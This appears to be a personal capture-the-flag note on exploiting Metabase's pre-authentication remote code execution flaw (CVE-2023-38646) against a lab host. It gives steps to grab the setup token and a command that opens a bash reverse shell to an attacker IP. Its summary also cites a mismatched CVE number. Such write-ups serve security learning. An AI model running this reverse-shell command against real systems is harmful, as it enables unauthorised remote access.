## page
![[Pasted image 20231122120642.png]]

## metabase

```docx
Metabase is **an open source tool that allows for powerful data instrumentation, visualization, and querying**.
```

## metabase exploit

https://pentest-tools.com/vulnerabilities-exploits/metabase-remote-code-execution_CVE-2023-38646

https://infosecwriteups.com/cve-2023-38646-metabase-pre-auth-rce-866220684396

https://github.com/shamo0/CVE-2023-38646-PoC/blob/main/CVE-2023-38646.py (this exploit works)


## summary of exploit
```
Metabase open source versions before 0.46.6.1 and Metabase Enterprise versions before 1.46.6.1 are vulnerable to CVE-2023-33246, a Remote Code Execution vulnerability. The root cause of this vulnerability is that the setup token is not cleared after the setup is completed. This allows an unauthenticated attacker to get the setup token and use it to execute commands on the target remotely.
```

## further reading
https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/

## exploit steps
- go to `/api/session/properties`
- copy `setup-token` from the response
- start listener
### trigger exploit
```bash
python3 main.py  -u http://data.analytical.htb -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c 'bash -i >& /dev/tcp/10.10.16.49/9001 0>&1'
```
